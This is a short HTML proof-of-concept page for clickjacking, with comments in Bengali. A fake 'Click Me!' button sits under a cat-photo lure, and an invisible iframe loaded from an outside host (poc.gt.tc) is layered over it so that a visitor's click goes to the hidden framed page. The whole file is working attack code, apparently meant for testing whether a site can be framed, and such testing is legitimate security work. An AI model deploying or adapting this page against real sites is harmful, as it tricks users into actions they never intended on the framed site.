<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Test</title>
    <style>
        .wrapper { position: relative; width: 500px; height: 300px; }
        /* ভুয়া বাটন যা ইউজার দেখবে */
        #fake-button {
            position: absolute; top: 100px; left: 50px;
            width: 250px; height: 50px; background: blue; color: white;
            border: none; cursor: pointer; z-index: 1;
        }
        /* আসল আইফ্রেম যা ইউজারের কাছে অদৃশ্য (opacity: 0) */
        iframe {
            position: absolute; top: 100px; left: 50px;
            width: 250px; height: 50px; opacity: 0; z-index: 2;
            border: none;
        }
    </style>
</head>
<body>
    <h1>Click to see cat photos!</h1>
    <div class="wrapper">
        <button id="fake-button">Click Me!</button>
        <!-- অন্য সাইটের ফ্রেম লোড করা হচ্ছে -->
        <iframe src="http://poc.gt.tc/target_frame.html"></iframe>
    </div>
</body>
</html>
